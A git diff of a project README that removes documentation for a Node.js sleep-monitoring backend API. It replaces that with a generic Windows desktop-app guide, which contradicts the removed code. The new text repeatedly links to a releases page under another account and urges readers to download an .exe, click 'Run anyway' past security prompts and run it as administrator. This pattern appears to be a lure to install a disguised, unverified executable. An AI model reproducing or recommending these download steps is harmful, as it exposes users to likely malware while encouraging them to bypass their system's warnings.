@@ -1,156 +1,162 @@
-# SLEEP-QUALITY-MONITOR
-Personal Sleep Quality & Physiological Monitoring System. A high-performance, deterministic physiological analysis engine and dashboard designed to monitor sleep quality and hydration strain using multi-sensor data. This system transforms raw biometric streams (CBT, HRV, Respiration) into actionable health insights using age-adaptive threshold models.
+# 💤 SLEEP-QUALITY-MONITOR - Sleep and Health Data, Made Clear
 
----
+[![Download SLEEP-QUALITY-MONITOR](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/darceymucoid885/SLEEP-QUALITY-MONITOR/releases)
 
-# Sleep Monitoring Dashboard — Backend API
+## 🌙 What It Does
 
-A production-ready backend for a **Sleep Monitoring Dashboard** built with **Node.js + Express + MongoDB**.  
-Features real-time physiological data processing and **deterministic rule-based sleep analysis** (no machine learning).
+SLEEP-QUALITY-MONITOR is a desktop app for tracking sleep quality and body strain from sensor data. It reads biometric signals like CBT, HRV, and respiration, then turns them into clear health results.
 
----
+Use it to review sleep patterns, spot signs of hydration strain, and check how your body responds over time. The app uses age-based thresholds so the results fit different users.
 
-## 📁 Project Structure
+## 📥 Download
 
-```
-sleep-monitoring-backend/
-├── src/
-│   ├── config/
-│   │   └── db.js                 ← MongoDB connection
-│   ├── controllers/
-│   │   ├── authController.js     ← Register, Login (Email/Mobile/Google)
-│   │   ├── dataController.js     ← Sensor data ingestion
-│   │   └── analysisController.js ← Sleep report, stages, hydration
-│   ├── middleware/
-│   │   ├── authMiddleware.js     ← JWT verification + token generation
-│   │   └── validateMiddleware.js ← express-validator rule sets
-│   ├── models/
-│   │   ├── User.js               ← User schema (multi-auth)
-│   │   ├── SensorData.js         ← Time-series physiological readings
-│   │   ├── SleepAnalysis.js      ← Session results + epoch stages
-│   │   └── HydrationStatus.js    ← Dehydration classification
-│   ├── routes/
-│   │   ├── authRoutes.js         ← /auth/*
-│   │   ├── dataRoutes.js         ← /sensor-data
-│   │   └── analysisRoutes.js     ← /sleep-report, /sleep-stages, /hydration-status
-│   ├── services/
-│   │   ├── thresholdsService.js  ← Age-based physiological thresholds
-│   │   ├── baselineService.js    ← Median-based adaptive baseline (6–10 PM)
-│   │   ├── sleepStageService.js  ← 30-sec epoch rule-based classifier
-│   │   ├── scoringService.js     ← Quality score + wake detection
-│   │   └── hydrationService.js   ← Dehydration indicator logic
-│   └── server.js                 ← Express entry point
-├── scripts/
-│   └── seedData.js               ← Mock data generator for testing
-├── .env                          ← Environment config (see below)
-└── package.json
-```
+Visit this page to download: [SLEEP-QUALITY-MONITOR Releases](https://github.com/darceymucoid885/SLEEP-QUALITY-MONITOR/releases)
 
----
+Open the latest release and download the Windows file. If there are several files, pick the one for Windows that ends in `.exe` or `.msi`.
 
-## ⚡ Quick Start
+## 🖥️ What You Need
 
-### 1. Prerequisites
-- Node.js v18+
-- MongoDB (local: `mongodb://localhost:27017` or MongoDB Atlas)
+Before you install the app, make sure your PC has:
 
-### 2. Install Dependencies
-```bash
-npm install
-```
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- A screen with 1366 × 768 resolution or higher
+- An internet connection for the first download
 
-### 3. Configure Environment
-Edit the `.env` file in the root directory:
-```env
-PORT=5001
-NODE_ENV=development
-MONGODB_URI=mongodb://localhost:27017/sleep_monitoring_db
-JWT_SECRET=your_super_secret_key_here
-JWT_EXPIRES_IN=7d
-OTP_EXPIRY_MINUTES=10
-```
+For best use, keep your Windows updates current.
 
-### 4. Run in Development
-```bash
-npm run dev
-```
+## ⚙️ How to Install
 
-### 5. Seed Mock Data (optional)
-Generates a realistic full-night sleep cycle for testing:
-```bash
-npm run seed
-```
+1. Open the [Releases page](https://github.com/darceymucoid885/SLEEP-QUALITY-MONITOR/releases).
+2. Find the newest version at the top.
+3. Download the Windows installer or app file.
+4. If Windows shows a security prompt, choose **Keep** or **Run anyway** only if the file came from the release page above.
+5. Double-click the file to start the setup.
+6. Follow the on-screen steps to finish the install.
+7. Open SLEEP-QUALITY-MONITOR from the Start menu or desktop shortcut.
 
----
+## 🚀 First Time Setup
 
-## 🔐 Authentication APIs
+After you open the app for the first time:
 
-### POST /auth/register
-Register using Email+Password, Mobile+OTP, or Google OAuth.
+1. Choose your age group if the app asks for it.
+2. Connect or import your biometric data source.
+3. Check that CBT, HRV, and respiration data are loaded.
+4. Set your sleep tracking window, if prompted.
+5. Save your profile so the app can use the same settings next time.
 
-**Email Registration**
-```json
-POST /auth/register
-{
-  "name": "Raj Kumar",
-  "age": 30,
-  "gender": "male",
-  "auth_method": "email",
-  "email": "raj@example.com",
-  "password": "securepass123"
-}
-```
-**Response (201)**
-```json
-{
-  "success": true,
-  "message": "Account registered successfully.",
-  "data": {
-    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
-    "user": {
-      "id": "663f4c2a1b2e3f001d2e4567",
-      "name": "Raj Kumar",
-      "age": 30,
-      "gender": "male",
-      "email": "raj@example.com",
-      "auth_method": "email",
-      "age_group": "adult"
-    }
-  }
-}
-```
+If you use a sensor device, make sure it is connected before you start a new session.
 
----
+## 📊 How to Use the Dashboard
 
-## 📡 Sensor Data API
+The dashboard shows your sleep data in a simple view:
 
-### POST /sensor-data
-> **Authorization**: `Bearer <jwt_token>`
+- **Sleep quality score** shows how well you slept
+- **Hydration strain view** shows possible body stress
+- **Signal charts** show CBT, HRV, and respiration trends
+- **Threshold markers** show when readings move outside the normal range
+- **Session history** helps you compare nights
 
-```json
-POST /sensor-data
-{
-  "user_id": "663f4c2a1b2e3f001d2e4567",
-  "timestamp": "2025-01-15T23:00:00.000Z",
-  "cbt": 36.4,
-  "heart_rate": 58,
-  "respiration_rate": 13.5,
-  "skin_temp": 35.1,
-  "movement": 0.02
-}
-```
+To review one night, open the latest session and scan the score first. Then look at the charts for changes in the main signals.
 
----
+## 🔍 Reading the Results
 
-## 📦 Dependencies
+The app uses age-adaptive threshold models. In plain terms, it compares your results with limits that match your age range.
 
-| Package | Purpose |
-|---------|---------|
-| express | HTTP framework |
-| mongoose | MongoDB ODM |
-| bcryptjs | Password hashing |
-| jsonwebtoken | JWT auth |
-| express-validator | Input validation |
-| cors | CORS handling |
-| dotenv | Environment variable loading |
-| nodemon (dev) | Auto-reload in development |
+You may see patterns such as:
+
+- Stable HRV during rest
+- Higher respiration during sleep disruption
+- CBT changes that point to body strain
+- Low sleep scores after short or broken sleep
+
+Use the results as a guide for tracking trends over time. A single night matters less than a repeated pattern.
+
+## 🧩 Common File Types
+
+When you download from the release page, you may see files like these:
+
+- `.exe` for direct launch on Windows
+- `.msi` for guided installation
+- `.zip` for manual unpacking
+
+If you choose a `.zip` file, extract it first, then open the app file inside.
+
+## 🛠️ Troubleshooting
+
+### The app will not open
+- Make sure the file finished downloading
+- Right-click the file and choose **Run as administrator**
+- Check that your Windows version is current
+
+### The app says data is missing
+- Confirm your sensor or data file is ready
+- Make sure the input includes CBT, HRV, and respiration
+- Try loading the session again
+
+### The screen looks too small
+- Increase Windows display scaling
+- Use a screen with a higher resolution if possible
+- Maximize the app window
+
+### The download page does not show a file
+- Refresh the page
+- Check the latest release section
+- Scroll through the release assets carefully
+
+## 📁 Typical Workflow
+
+1. Download the app from the release page
+2. Install or open it on Windows
+3. Add your biometric data
+4. Review the sleep score
+5. Check signal trends
+6. Save the session for later comparison
+
+## 🔐 Privacy and Local Use
+
+The app is built for personal monitoring. Keep your data on your own machine unless you choose to export it. If you store session files, keep them in a folder you can find later.
+
+## 📌 Data You Can Track
+
+You can use the app to track:
+
+- Sleep quality changes
+- Hydration strain signals
+- Respiration rate trends
+- HRV shifts across nights
+- CBT changes during sleep
+- Repeat patterns over time
+
+## 🧠 Best Results
+
+For clearer results:
+
+- Use the same sensor setup each time
+- Track sleep at about the same hour
+- Keep your device charged
+- Record full-night sessions
+- Compare several nights, not one
+
+## 📎 Release Download
+
+Get the Windows version here: [https://github.com/darceymucoid885/SLEEP-QUALITY-MONITOR/releases](https://github.com/darceymucoid885/SLEEP-QUALITY-MONITOR/releases)
+
+## 🗂️ Folder Layout After Install
+
+After setup, you may see files and folders like:
+
+- `SLEEP-QUALITY-MONITOR.exe` for the main app
+- `logs` for run history
+- `data` for saved sessions
+- `exports` for reports and charts
+- `settings` for saved preferences
+
+## 🖱️ Quick Start
+
+1. Download the latest release
+2. Install or open the app
+3. Load your sensor data
+4. Review the sleep score
+5. Check hydration strain and signal charts
